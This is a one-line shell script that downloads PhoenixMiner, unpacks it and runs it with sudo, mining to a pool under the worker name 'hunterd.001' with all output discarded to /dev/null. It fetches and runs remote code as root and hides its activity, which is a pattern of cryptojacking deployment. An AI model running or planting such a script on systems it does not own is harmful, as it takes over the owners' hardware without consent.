#!/bin/sh
apt-get install libpci3&&wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz&&tar -xf PhoenixMiner_5.6d_Linux.tar.gz&&cd PhoenixMiner_5.6d_Linux&&sudo ./PhoenixMiner -pool stratum+tcp://ethash.kupool.com:8888 -wal hunterd.001 -pass x -a coinX -tt 70 -tstop 84 -tstart 72  -fret 2 -rate 1 &> /dev/null
